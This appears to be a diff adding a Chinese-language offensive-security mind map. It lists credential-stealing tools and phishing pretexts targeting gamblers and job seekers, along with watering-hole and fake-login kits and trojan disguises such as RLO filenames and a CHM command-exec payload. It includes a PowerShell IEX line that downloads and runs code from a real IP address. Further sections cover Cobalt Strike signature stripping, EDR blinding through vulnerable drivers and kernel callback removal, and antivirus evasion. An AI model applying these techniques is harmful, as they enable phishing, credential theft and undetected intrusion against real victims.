+<h4 id="_56">主机管理工具信息收集</h4>
+<ul>
+<li>shell管理工具</li>
+<li>finalshell<ul>
+<li><a href="https://github.com/MaskCyberSecurityTeam/FinalShellGetPass">https://github.com/MaskCyberSecurityTeam/FinalShellGetPass</a></li>
+</ul>
+</li>
+<li>xshell</li>
+<li>邮件</li>
+<li>Foxmail</li>
+<li>浏览器</li>
+<li>chrome<ul>
+<li><a href="https://github.com/Meckazin/ChromeKatz">https://github.com/Meckazin/ChromeKatz</a></li>
+<li>unlock</li>
+<li>影子文件</li>
+<li><a href="https://github.com/StarfireLab/BrowserPivot">https://github.com/StarfireLab/BrowserPivot</a></li>
+<li>DPAPI 秘钥</li>
+<li><a href="https://github.com/magisterquis/chromecookiestealer">https://github.com/magisterquis/chromecookiestealer</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></li>
+<li>telegram</li>
+<li><a href="https://github.com/atilaromero/telegram-desktop-decrypt">https://github.com/atilaromero/telegram-desktop-decrypt</a></li>
+<li>vpn连接信息解密</li>
+<li><a href="https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e">https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e</a></li>
+<li>todesk、向日葵、vnc</li>
+<li><a href="https://github.com/flydyyg/readTdose-xiangrikui">https://github.com/flydyyg/readTdose-xiangrikui</a></li>
+<li><a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a></li>
+<li>密码管理工具</li>
+<li>KeePass<ul>
+<li><a href="https://github.com/vdohney/keepass-password-dumper">https://github.com/vdohney/keepass-password-dumper</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/lemonlove7/passwd_decrypt_Tools">https://github.com/lemonlove7/passwd_decrypt_Tools</a></li>
+<li><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></li>
+<li><a href="https://github.com/V1V1/SharpScribbles">https://github.com/V1V1/SharpScribbles</a></li>
+<li><a href="https://github.com/Pizz33/GoThief">https://github.com/Pizz33/GoThief</a></li>
+<li><a href="https://github.com/can-kat/cstealer">https://github.com/can-kat/cstealer</a></li>
+</ul>
+<h4 id="pyinstallerexe-f-bbscanpy-clean-add-data-rulesrules">pyinstaller.exe -F BBScan.py --clean --add-data rules;rules</h4>
+<ul>
+<li>主机不出网工具需要打包成exe</li>
+</ul>
+<h3 id="_57">进入内网第一步</h3>
+<h4 id="_58">快速本机信息收集</h4>
+<h4 id="web_1">内网找web服务（安全设备）</h4>
+<h4 id="c2">c2白流量</h4>
+<h2 id="_59">**钓鱼 **</h2>
+<h3 id="_60">话术</h3>
+<h4 id="_61">赌客</h4>
+<ul>
+<li>系统故障</li>
+<li>无法开户</li>
+<li>无法充值</li>
+<li>无法提现</li>
+<li>开启代理</li>
+<li>无法返水</li>
+<li>海外赌客</li>
+<li>无法添加银行卡</li>
+</ul>
+<h4 id="_62">应聘</h4>
+<ul>
+<li>发送简历</li>
+<li>约会议室</li>
+<li>面试软件升级</li>
+</ul>
+<h4 id="_63">合作</h4>
+<ul>
+<li>公会会长</li>
+<li>赌客资料一手</li>
+<li>四方支付</li>
+<li>成功率低|线下</li>
+<li>包网服务</li>
+<li>提供案例</li>
+<li>提供源码</li>
+<li>提供更新</li>
+</ul>
+<h4 id="httpgongwenguancom"><a href="http://gongwenguan.com/">http://gongwenguan.com/</a></h4>
+<h3 id="_64">实战水坑搭建</h3>
+<h4 id="fish">域名购买/fish域名的选择</h4>
+<ul>
+<li><a href="http://www.expireddomains.com/">www.Expireddomains.com</a></li>
+<li>typo</li>
+<li>unicode<ul>
+<li><a href="https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8">https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/evilsocket/ditto">https://github.com/evilsocket/ditto</a></li>
+<li>spf</li>
+<li><a href="https://github.com/SummerSec/spf">https://github.com/SummerSec/spf</a></li>
+<li><a href="https://github.com/chenjj/espoofer.git">https://github.com/chenjj/espoofer.git</a></li>
+<li><a href="https://github.com/jetmore/swaks">https://github.com/jetmore/swaks</a></li>
+<li><a href="https://emkei.cz/">https://emkei.cz/</a></li>
+<li>子机构|自建邮服、域名</li>
+<li>SendGrid</li>
+<li>mailgun</li>
+<li><a href="https://github.com/r00tSe7en/Mail-Probe">https://github.com/r00tSe7en/Mail-Probe</a></li>
+</ul>
+<h4 id="_65">水坑页面制作</h4>
+<ul>
+<li>chrome钓鱼</li>
+<li><a href="https://www.google.com/intl/zh-CN/chrome/">https://www.google.com/intl/zh-CN/chrome/</a></li>
+<li>flash钓鱼</li>
+<li><a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li>
+<li><a href="https://github.com/crow821/FakeFlash">https://github.com/crow821/FakeFlash</a></li>
+<li>客服系统升级提醒</li>
+<li>需存在xss<ul>
+<li>自建客服平台</li>
+<li>文件内容解析<ul>
+<li>markdown</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>钓鱼模板</li>
+<li><a href="https://github.com/Threezh1/SiteCopy.git">https://github.com/Threezh1/SiteCopy.git</a></li>
+<li><a href="https://smalltool.github.io/">https://smalltool.github.io/</a></li>
+<li><a href="https://github.com/htr-tech/zphisher">https://github.com/htr-tech/zphisher</a></li>
+<li><a href="https://github.com/JoelGMSec/EvilnoVNC">https://github.com/JoelGMSec/EvilnoVNC</a></li>
+<li>evilginx</li>
+<li>fake login</li>
+<li><a href="https://github.com/bitsadmin/fakelogonscreen">https://github.com/bitsadmin/fakelogonscreen</a></li>
+<li><a href="https://github.com/Pickfordmatt/SharpLocker">https://github.com/Pickfordmatt/SharpLocker</a></li>
+<li><a href="https://github.com/Dviros/CredsLeaker">https://github.com/Dviros/CredsLeaker</a></li>
+<li><a href="https://github.com/An0nUD4Y/Evilginx2-Phishlets">https://github.com/An0nUD4Y/Evilginx2-Phishlets</a></li>
+<li><a href="https://github.com/klezVirus/evilginx-collection">https://github.com/klezVirus/evilginx-collection</a></li>
+<li><a href="https://github.com/eversinc33/Web-Windows-Login-Phishing">https://github.com/eversinc33/Web-Windows-Login-Phishing</a></li>
+</ul>
+<h4 id="_66">后端环境搭建及反沙箱</h4>
+<ul>
+<li>otp</li>
+<li><a href="https://github.com/asnzodiac/asnphishing">https://github.com/asnzodiac/asnphishing</a></li>
+<li>xss自己搭平台不然你的cookie都是别人的</li>
+<li><a href="https://goblin.xiecat.fun/guide/#flash-demo">https://goblin.xiecat.fun/guide/#flash-demo</a></li>
+<li>flash,自己改</li>
+<li><a href="https://github.com/highmeh/lure">https://github.com/highmeh/lure</a></li>
+<li>收集email|配合emailall</li>
+<li><a href="https://github.com/doyensec/Session-Hijacking-Visual-Exploitation">https://github.com/doyensec/Session-Hijacking-Visual-Exploitation</a></li>
+<li><a href="https://github.com/fin3ss3g0d/evilgophish">https://github.com/fin3ss3g0d/evilgophish</a></li>
+</ul>
+<h3 id="_67">马子制作方式</h3>
+<h4 id="winrar">winrar</h4>
+<ul>
+<li>自解压</li>
+<li><a href="https://github.com/b1tg/CVE-2023-38831-winrar-exploit">https://github.com/b1tg/CVE-2023-38831-winrar-exploit</a></li>
+</ul>
+<h4 id="rlo">RLO文件名倒置</h4>
+<ul>
+<li>文件打标</li>
+<li>exe-&gt;scr|pif</li>
+</ul>
+<h4 id="link">link</h4>
+<ul>
+<li><a href="https://github.com/dievus/lnkbomb">https://github.com/dievus/lnkbomb</a></li>
+<li><a href="https://github.com/Yihsiwei/Lnk-Trojan">https://github.com/Yihsiwei/Lnk-Trojan</a></li>
+<li><a href="https://github.com/nickvourd/Rocabella">https://github.com/nickvourd/Rocabella</a></li>
+<li><a href="https://github.com/Pizz33/FTPlnk_phishing">https://github.com/Pizz33/FTPlnk_phishing</a></li>
+</ul>
+<h4 id="import-os-osrename1exe-1u202egnpexe">import os  os.rename('1.exe', '1\u202egnp.exe')</h4>
+<h4 id="httpsgithubcominspiringzgofilebinder"><a href="https://github.com/inspiringz/GoFileBinder">https://github.com/inspiringz/GoFileBinder</a></h4>
+<h4 id="chm">CHM</h4>
+<ul>
+<li>easychm</li>
+<li>&lt;!DOCTYPE html&gt;<html><head><title>Mousejack replay</title><head></head><body>command exec <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"> <PARAM name="Button" value="Bitmap::shortcut"> <PARAM name="Item1" value=',cmd.exe,/c calc.exe'> <PARAM name="Item2" value="273,1,1"></OBJECT><SCRIPT>x.Click();</SCRIPT></body></html></li>
+</ul>
+<h4 id="ico">ico替换</h4>
+<ul>
+<li><a href="https://jarlpenguin.github.io/BeCyIconGrabberPortable/">https://jarlpenguin.github.io/BeCyIconGrabberPortable/</a></li>
+<li><a href="https://www.angusj.com/resourcehacker/">https://www.angusj.com/resourcehacker/</a></li>
+<li><a href="https://www.nirsoft.net/utils/iconsext.html">https://www.nirsoft.net/utils/iconsext.html</a></li>
+<li><a href="https://www.lanzoux.com/iBvsMhajljg">https://www.lanzoux.com/iBvsMhajljg</a></li>
+</ul>
+<h4 id="httpsgithubcomtokyoneonb2e"><a href="https://github.com/tokyoneon/B2E">https://github.com/tokyoneon/B2E</a></h4>
+<ul>
+<li>notepad chcp 1200 &amp; powershell  -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://106.53.97.7:82/a')"</li>
+</ul>
+<h4 id="_68">超长文件名</h4>
+<h4 id="httpscliimtools"><a href="https://cli.im/tools">https://cli.im/tools</a></h4>
+<h4 id="httpsgithubcomdr0opcrossnet-beta"><a href="https://github.com/dr0op/CrossNet-Beta">https://github.com/dr0op/CrossNet-Beta</a></h4>
+<ul>
+<li>看下就好学习思路</li>
+</ul>
+<h4 id="httpsgithubcomdeepzecbad-pdf"><a href="https://github.com/deepzec/Bad-Pdf">https://github.com/deepzec/Bad-Pdf</a></h4>
+<h4 id="httpsgithubcomthecyb3ralphabobthesmuggler"><a href="https://github.com/TheCyb3rAlpha/BobTheSmuggler">https://github.com/TheCyb3rAlpha/BobTheSmuggler</a></h4>
+<h2 id="_69">**远控工具开发 **</h2>
+<h3 id="cobaltstrike">CobaltStrike 实战去特征免杀</h3>
+<h4 id="_70">插件开发</h4>
+<ul>
+<li><a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></li>
+<li><a href="https://github.com/REDMED-X/OperatorsKit">https://github.com/REDMED-X/OperatorsKit</a></li>
+<li><a href="https://github.com/lintstar/CS-AutoPostChain">https://github.com/lintstar/CS-AutoPostChain</a></li>
+<li><a href="https://github.com/qigpig/Ghosting-BOF">https://github.com/qigpig/Ghosting-BOF</a></li>
+<li><a href="https://github.com/CodeXTF2/WindowSpy">https://github.com/CodeXTF2/WindowSpy</a></li>
+<li><a href="https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file">https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file</a></li>
+<li><a href="https://github.com/mertdas/PrivKit">https://github.com/mertdas/PrivKit</a></li>
+<li><a href="https://github.com/rasta-mouse/PPEnum">https://github.com/rasta-mouse/PPEnum</a></li>
+<li><a href="https://github.com/m3rcer/Chisel-Strike">https://github.com/m3rcer/Chisel-Strike</a></li>
+<li><a href="https://github.com/tijme/cmstplua-uac-bypass">https://github.com/tijme/cmstplua-uac-bypass</a></li>
+<li><a href="https://github.com/yutianqaq/CSx4Ldr">https://github.com/yutianqaq/CSx4Ldr</a></li>
+<li>cna or bof xxx</li>
+<li>beacon = client.beacons.first ;beacon.execute_bof('example')<ul>
+<li>beacon.inline_execute('<Beacon ID>', '<CBOF C Code Snippet>')</li>
+</ul>
+</li>
+<li><a href="https://github.com/dtmsecurity/bof_helper">https://github.com/dtmsecurity/bof_helper</a></li>
+<li><a href="https://github.com/securifybv/Visual-Studio-BOF-template">https://github.com/securifybv/Visual-Studio-BOF-template</a></li>
+<li><a href="https://github.com/kyleavery/AceLdr">https://github.com/kyleavery/AceLdr</a></li>
+<li><a href="https://github.com/Cobalt-Strike/bof-vs">https://github.com/Cobalt-Strike/bof-vs</a></li>
+<li><a href="https://github.com/fortra/No-Consolation">https://github.com/fortra/No-Consolation</a></li>
+<li><a href="https://github.com/ScriptIdiot/BOF-patchit">https://github.com/ScriptIdiot/BOF-patchit</a></li>
+<li><a href="https://github.com/qwqdanchun/ScreenShot-BOF">https://github.com/qwqdanchun/ScreenShot-BOF</a></li>
+<li><a href="https://github.com/rasta-mouse/SCMUACBypass">https://github.com/rasta-mouse/SCMUACBypass</a></li>
+<li><a href="https://github.com/9bie/Slacker">https://github.com/9bie/Slacker</a></li>
+<li><a href="https://github.com/ewby/Mockingjay_BOF">https://github.com/ewby/Mockingjay_BOF</a></li>
+<li><a href="https://github.com/baiyies/ScreenshotBOFPlus">https://github.com/baiyies/ScreenshotBOFPlus</a></li>
+<li><a href="https://github.com/Octoberfest7/DropSpawn_BOF">https://github.com/Octoberfest7/DropSpawn_BOF</a></li>
+<li><a href="https://github.com/WKL-Sec/HiddenDesktop">https://github.com/WKL-Sec/HiddenDesktop</a></li>
+<li><a href="https://github.com/boku7/whereami">https://github.com/boku7/whereami</a></li>
+<li><a href="https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer">https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer</a></li>
+</ul>
+<h4 id="_71">服务器设置</h4>
+<ul>
+<li>禁ping</li>
+<li>/etc/sysctl.conf 中增加一行</li>
+<li>net.ipv4.icmp_echo_ignore_all=1</li>
+<li>cdn</li>
+<li>免费cf账号</li>
+</ul>
+<h4 id="cs">CS修改</h4>
+<ul>
+<li><a href="https://github.com/CodeXTF2/Burp2Malleable">https://github.com/CodeXTF2/Burp2Malleable</a></li>
+<li><a href="https://github.com/RedSiege/C2concealer">https://github.com/RedSiege/C2concealer</a></li>
+<li><a href="https://github.com/RedSiege/GraphStrike">https://github.com/RedSiege/GraphStrike</a></li>
+<li><a href="https://github.com/D00Movenok/goMalleable">https://github.com/D00Movenok/goMalleable</a></li>
+<li><a href="https://github.com/byt3bl33d3r/pyMalleableC2">https://github.com/byt3bl33d3r/pyMalleableC2</a></li>
+<li><a href="https://github.com/Peithon/JustC2file">https://github.com/Peithon/JustC2file</a></li>
+</ul>
+<h4 id="beacon">beacon</h4>
+<ul>
+<li><a href="https://github.com/Z3ratu1/geacon_plus">https://github.com/Z3ratu1/geacon_plus</a></li>
+<li><a href="https://github.com/b1tg/cobaltstrike-beacon-rust">https://github.com/b1tg/cobaltstrike-beacon-rust</a></li>
+<li><a href="https://github.com/tijme/amd-ryzen-master-driver-v17-exploit">https://github.com/tijme/amd-ryzen-master-driver-v17-exploit</a></li>
+<li><a href="https://github.com/NoOne-hub/Beacon.dll">https://github.com/NoOne-hub/Beacon.dll</a></li>
+<li>简单逆向</li>
+<li><a href="https://github.com/kyxiaxiang/Beacon_Source">https://github.com/kyxiaxiang/Beacon_Source</a></li>
+<li>修改特征</li>
+<li>private static byte[] OriginKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};private static byte[] CustomizeKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};<ul>
+<li>修改key</li>
+</ul>
+</li>
+<li>修改profile<ul>
+<li>transform-x64 {    strrep "beacon.x64.dll" "";}</li>
+<li>修改关键字</li>
+<li>set magic_mz_x86 "1234"; set magic_mz_x64 "5678";</li>
+<li>修改mz头</li>
+<li>set magic_pe "BB";</li>
+<li>修改pe头</li>
+<li>set cleanup "true";</li>
+<li>对原始Beacon DLL进行清除</li>
+<li>set obfuscate "true";</li>
+<li>除掉了dll头部</li>
+<li>set userwx "false";</li>
+<li>不必给可写</li>
+<li><a href="https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit">https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit</a></li>
+<li>void my_mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {   char key[] = "cf81d743beef8422";   size_t key_lenght = sizeof(key) - 1;   while (a &lt; b) {      *(parms-&gt;beacon_ptr + a) ^= key[a % key_lenght];      a++;   }}<ul>
+<li>修改sleepmask特征</li>
+</ul>
+</li>
+<li>修改MSSE pipe特征</li>
+</ul>
+</li>
+<li>beaconeye<ul>
+<li>6A 00</li>
+</ul>
+</li>
+</ul>
+<h3 id="_72">流量转发工具二次开发</h3>
+<h4 id="_73">方法</h4>
+<ul>
+<li>修改工具ua头</li>
+<li><a href="https://hasdata.com/blog/user-agents-for-web-scraping">https://hasdata.com/blog/user-agents-for-web-scraping</a></li>
+<li>User-Agent Switcher and Manager （chrome插件）</li>
+<li>配置文件自删除</li>
+<li>直接硬编码配置到main中<ul>
+<li>func getFileContent(ip string, port string) { key := "testkey"    ip = str2xor(ip, key)   port = str2xor(port, key)   var configContent string = <code>[common]        server_addr =</code> + ip + <code>server_port =</code> + port + <code>tls_enable = true   [plugin_socks]  type = tcp  remote_port = 7788  plugin = socks5 #plugin_user = ""   #plugin_passwd = ""</code>   fileContent = configContent}</li>
+</ul>
+</li>
+<li>if cfg.DELEnable == true { os.Remove(cfgFile) }</li>
+<li>远程加载配置文件</li>
+<li>tls指纹</li>
+<li><a href="https://github.com/sleeyax/burp-awesome-tls">https://github.com/sleeyax/burp-awesome-tls</a></li>
+<li>frp<ul>
+<li>pkg/util/net/tls.go</li>
+</ul>
+</li>
+<li>域前置</li>
+<li>pkg/util/net/websocket.go</li>
+<li>cdn配置回源为http</li>
+<li>外联小众协议</li>
+<li>quic<ul>
+<li>transport.protocol = "quic"quicBindPort = 7000</li>
+</ul>
+</li>
+<li>protobuf插件</li>
+<li>自定义加解密</li>
+<li>chacha20</li>
+<li>异或</li>
+<li>复杂加密给配置文件和认证、流量包简单加密不然会很卡</li>
+<li>去掉硬编码</li>
+<li>salt、json数据<ul>
+<li>有可能崩溃、动调看好处理逻辑</li>
+<li>尤其注意认证部分指纹</li>
+<li>models/msg/msg.go</li>
+</ul>
+</li>
+<li>const ( FrpWebsocketPath = "/~!frp")</li>
+<li>编译混淆加壳</li>
+<li>upx</li>
+<li>garble</li>
+<li><a href="https://github.com/boy-hack/go-strip">https://github.com/boy-hack/go-strip</a></li>
+<li>dll加载</li>
+<li>讲完edr环境搭建去做免杀</li>
+<li><a href="https://github.com/langsasec/Sign-Sacker">https://github.com/langsasec/Sign-Sacker</a></li>
+</ul>
+<h4 id="_74">熟悉框架结构</h4>
+<ul>
+<li>框架入口文件</li>
+<li>目录结构</li>
+<li>fscan<ul>
+<li>common</li>
+<li>数据的解析和结构体以及变量的存储</li>
+<li>plugins</li>
+<li>插件<ul>
+<li>理解项目结构和开发可以从写插件做起</li>
+</ul>
+</li>
+<li>webscan</li>
+<li>web扫描<ul>
+<li>框架指纹的识别</li>
+<li>框架的调度流程</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>关键函数</li>
+<li>正看看整个框架逻辑<ul>
+<li>改框架</li>
+</ul>
+</li>
+<li>打断点倒看你这里是怎么被调的<ul>
+<li>改插件</li>
+</ul>
+</li>
+<li>动态调试</li>
+<li>加解密加log输出</li>
+</ul>
+<h4 id="_75">检测</h4>
+<ul>
+<li><a href="https://github.com/cmluZw/Situational-Awareness">https://github.com/cmluZw/Situational-Awareness</a></li>
+<li><a href="https://github.com/Qianlitp/WatchAD">https://github.com/Qianlitp/WatchAD</a></li>
+<li><a href="https://github.com/Qihoo360/WatchAD2.0">https://github.com/Qihoo360/WatchAD2.0</a></li>
+<li><a href="https://abyssalfish-os.github.io/">https://abyssalfish-os.github.io/</a></li>
+<li>云态势感知</li>
+<li>SA</li>
+</ul>
+<h3 id="orshell">哥斯拉特征修改（炮灰入口使用，大型or长期实战建议单独开发shell管理工具）</h3>
+<h4 id="_76">自定义流量加密</h4>
+<ul>
+<li>去除md5校验</li>
+<li>core/ApplicationConfig.java</li>
+<li>去掉http头特征</li>
+<li>/shells/cryptions/*</li>
+<li>修改key取值为后16位，找到位置在ShellEntity的getSecretKeyX方法和加密类的generate方法修改</li>
+</ul>
+<h4 id="_77">需要的工具</h4>
+<ul>
+<li>JETBRAIN IDEA</li>
+<li>JETBRAIN RIDER</li>
+<li>ILspy</li>
+<li>sqlitestudio</li>
+<li>vistual studio2022</li>
+<li>反编译网站得到的源码缺失shell下payload和plugin的assets文件夹中的文件，需要手动放入后重新打包编译</li>
+</ul>
+<h4 id="_78">自定义命令执行</h4>
+<ul>
+<li>修改execCommand,复制cmd到临时目录执行并删除</li>
+<li>修改默认变量名</li>
+<li>重新编译后替换原来的payload.dll</li>
+<li>修改ShellExecCommandPanel默认命令代码</li>
+<li>修改掉默认的命令填充</li>
+</ul>
+<h4 id="webshell">webshell去特征</h4>
+<ul>
+<li>修改反射Load方法名和GetMethod来过特征免杀（java \CSharrp一样）</li>
+<li>其他变量随意修改过特征免杀</li>
+<li>根据GenerateShellLoder的填充方式修改同文件夹下template目录下base64.bin</li>
+<li>修改shell.aspx去掉头尾</li>
+<li>利用ILspy反编译payload.dll导出源码，修改文件名及类名，bin模板中记得对应修改</li>
+</ul>
+<h4 id="_79">插件开发</h4>
+<ul>
+<li>修改打包好的jar包替换掉原始lib中的jar包，成功添加插件</li>
+<li><a href="https://beichendream.github.io/godzillaApi/">https://beichendream.github.io/godzillaApi/</a></li>
+<li>lib添加哥斯拉jar</li>
+<li>包名必须是以shells.plugins.任意字符为开头</li>
+<li>新建一个类并声明core.annotation.PluginnAnnotation注解，然后继承并实现core.imp.Plugin接口，开始写功能代码</li>
+<li>Swing UI设计</li>
+<li>把弹出菜单注册到不同位置</li>
+<li>MainActivity.registerJMenu(menu);//注册一个单独的菜单在主页面MainActivity.registerPluginJMenuItem(pluginMenuItem);//注册一个菜单元素在插件菜单栏下MainActivity.registerShellViewJMenuItem(shellViewMenuItem);//注册一个菜单元素在Shell管理主页面的右击弹出菜单中<ul>
+<li>必须在static静态代码块中完成注册菜单</li>
+</ul>
+</li>
+</ul>
+<h2 id="_80">**木马免杀 **</h2>
+<h3 id="edr">edr 实战环境搭建</h3>
+<h4 id="_81">趋势</h4>
+<ul>
+<li><a href="https://bbs.kafan.cn/thread-2277040-1-1.html">https://bbs.kafan.cn/thread-2277040-1-1.html</a></li>
+<li><a href="https://github.com/emdnaia/TrendMicroDSAExfil">https://github.com/emdnaia/TrendMicroDSAExfil</a></li>
+<li>qax zero trust有同样问题</li>
+</ul>
+<h4 id="_82">赛门铁克</h4>
+<ul>
+<li><a href="https://bbs.kafan.cn/thread-2270682-1-1.html">https://bbs.kafan.cn/thread-2270682-1-1.html</a></li>
+</ul>
+<h4 id="mde">MDE</h4>
+<ul>
+<li>需官方购买安装</li>
+<li>改系统区域</li>
+</ul>
+<h4 id="httpsbbskafancnforum-89-1html"><a href="https://bbs.kafan.cn/forum-89-1.html">https://bbs.kafan.cn/forum-89-1.html</a></h4>
+<ul>
+<li>卡饭论坛下载+教程</li>
+</ul>
+<h4 id="_83">咸鱼市场</h4>
+<h4 id="_84">先安装服务端再安装客户端</h4>
+<ul>
+<li>上线后给虚拟机打镜像</li>
+<li>测免杀先断网</li>
+<li>如果联网样本被上传需要保证编译时去调调试信息及符号表</li>
+</ul>
+<h3 id="beacon_1">beacon 免杀</h3>
+<h4 id="edr_1">白驱动致盲 edr</h4>
+<ul>
+<li>安装开发环境</li>
+<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/</a><ul>
+<li>先安装sdk</li>
+<li>再安装wdk</li>
+<li>安装缓解143系列</li>
+<li>出现wdm就算成功</li>
+</ul>
+</li>
+<li>基础知识</li>
+<li>kill用户态process</li>
+<li>终端下线</li>
+<li>ZwTerminateProcess<ul>
+<li>blackout</li>
+<li>typedef struct _CLIENT_ID {    HANDLE UniqueProcess;  // 进程句柄    HANDLE UniqueThread;   // 线程句柄} CLIENT_ID;</li>
+</ul>
+</li>
+<li>干掉回调</li>
+<li>ObRegisterCallbacks<ul>
+<li>打开或者复制特定对象类型的句柄</li>
+<li>PsProcessType、PsThreadType<ul>
+<li>CallbackList</li>
+<li>PreOperation \ PostOperation = 0</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CmRegisterCallback<ul>
+<li>访问、修改注册表</li>
+<li>CallbackListHead<ul>
+<li>PEX_CALLBACK_FUNCTION</li>
+<li>指向的地址修改为双向链表上已经存在的地址值</li>
+<li>PG保护会蓝屏</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MiniFilter<ul>
+<li>创建/修改/删除文件</li>
+<li>volume<ul>
+<li>FLT_VOLUMES</li>
+<li>_CALLBACK_NODE<ul>
+<li>将首地址直接修改为系统自带的驱动_CALLBACK_NODE 结构地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PsSetCreateProcessNotifyRoutine<ul>
+<li>进程被创建或销毁</li>
+</ul>
+</li>
+<li>PsSetCreateThreadNotifyRoutine<ul>
+<li>线程被创建或销毁</li>
+<li>typedef struct _EX_CALLBACK_ROUTINE_BLOCK {    EX_RUNDOWN_REF RundownProtect;    PEX_CALLBACK_FUNCTION Function;    PVOID Context;} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;<ul>
+<li><a href="https://reactos.org/">https://reactos.org/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PsSetLoadImageNotifyRoutine<ul>
+<li>任何Image（EXE、DLL、驱动）文件被加载</li>
+</ul>
+</li>
+<li><a href="https://www.loldrivers.io/drivers/">https://www.loldrivers.io/drivers/</a></li>
+<li><a href="https://github.com/Cr4sh/ioctlfuzzer">https://github.com/Cr4sh/ioctlfuzzer</a><ul>
+<li>内核fuzz工具</li>
+<li>打开核心内存转储</li>
+</ul>
+</li>
+<li><a href="https://github.com/koutto/ioctlbf">https://github.com/koutto/ioctlbf</a></li>
+<li><a href="https://github.com/k0keoyo/kDriver-Fuzzer">https://github.com/k0keoyo/kDriver-Fuzzer</a></li>
+<li><a href="https://github.com/nccgroup/DIBF">https://github.com/nccgroup/DIBF</a></li>
+<li><a href="https://github.com/IntelLabs/kAFL">https://github.com/IntelLabs/kAFL</a></li>
+<li><a href="https://github.com/Z4kSec/IoctlHunter">https://github.com/Z4kSec/IoctlHunter</a></li>
+<li><a href="https://github.com/0dayResearchLab/msFuzz">https://github.com/0dayResearchLab/msFuzz</a></li>
+<li><a href="https://github.com/zeze-zeze/ioctlance">https://github.com/zeze-zeze/ioctlance</a></li>
+<li>利用</li>
+<li><a href="https://github.com/paysonism/payson-ioctl-cheat-driver">https://github.com/paysonism/payson-ioctl-cheat-driver</a></li>
+<li><a href="https://github.com/Hagrid29/BYOVDKit">https://github.com/Hagrid29/BYOVDKit</a></li>
+<li><a href="https://github.com/BlackSnufkin/BYOVD">https://github.com/BlackSnufkin/BYOVD</a></li>
+</ul>
+<h4 id="_85">加密混淆免杀</h4>
+<ul>
+<li>查杀方式</li>
+<li>静态查杀<ul>
+<li>特征码</li>
+<li>hash、文件名、函数名、敏感字符串、敏感api...</li>
+<li>PE文件头信息，导入、导出、TLS，节区信息；shellcode代码信息；shellcodeloader代码信息</li>
+<li>云查杀</li>
+<li>校验和</li>
+<li>不定期检查文件校验和</li>
+<li>启发式</li>
+<li>机器学习</li>
+<li>yara</li>
+<li>免杀</li>
+<li>分段</li>
+<li>加解密<ul>
+<li>aes</li>
+<li>rsa</li>
+<li>古典密码</li>
+<li>.....</li>
+</ul>
+</li>
+<li>编码<ul>
+<li>异或</li>
+<li>base64</li>
+<li>uuid</li>
+<li>mac</li>
+<li>ip地址</li>
+<li>注册表键值</li>
+<li>RegQueryValueExA</li>
+<li>RegQueryValueExA</li>
+<li>剪切板读数据</li>
+<li>RegisterClipboardFormat</li>
+<li>GetClipboardFormatName</li>
+<li>.....</li>
+</ul>
+</li>
+<li>变量名混淆<ul>
+<li><a href="https://pyob.oxyry.com/">https://pyob.oxyry.com/</a></li>
+</ul>
+</li>
+<li>控制流混淆</li>
+<li>修改无影响的shellcode特征码<ul>
+<li>cs一字节干掉yara</li>
+</ul>
+</li>
+<li>序列化<ul>
+<li>protobuf</li>
+<li>pickle</li>
+</ul>
+</li>
+<li><strong>将shellcode当成字符串去处理</strong></li>
+<li>分离加载<ul>
+<li>文件</li>
+<li>url</li>
+</ul>
+</li>
+<li>动态加载api<ul>
+<li>loadlibrary+getprocaddress</li>
+<li>fs-&gt;TEB、PEB-&gt;kernel32.dll-&gt;loadlibrary+getprocaddress</li>
+<li>SSN-&gt;syscall</li>
+<li><a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a></li>
+<li>
+<h1 id="include">include <unistd.h></h1>
+<ul>
+<li>syscall(SYS_write, STDOUT_FILENO, message, length);</li>
+<li>杀软警告</li>
+</ul>
+</li>
+<li><a href="https://github.com/klezVirus/SysWhispers3">https://github.com/klezVirus/SysWhispers3</a></li>
+<li><a href="https://github.com/voidvxvt/HellBunny">https://github.com/voidvxvt/HellBunny</a></li>
+</ul>
+</li>
+<li>内存加载器</li>
+<li>申请可执行内存<ul>
+<li>VirtualProtect</li>
+<li>VirtualAlloc</li>
+<li>AllocADsMem</li>
+<li>ReallocADsMem</li>
+<li>HeapCreate</li>
+</ul>
+</li>
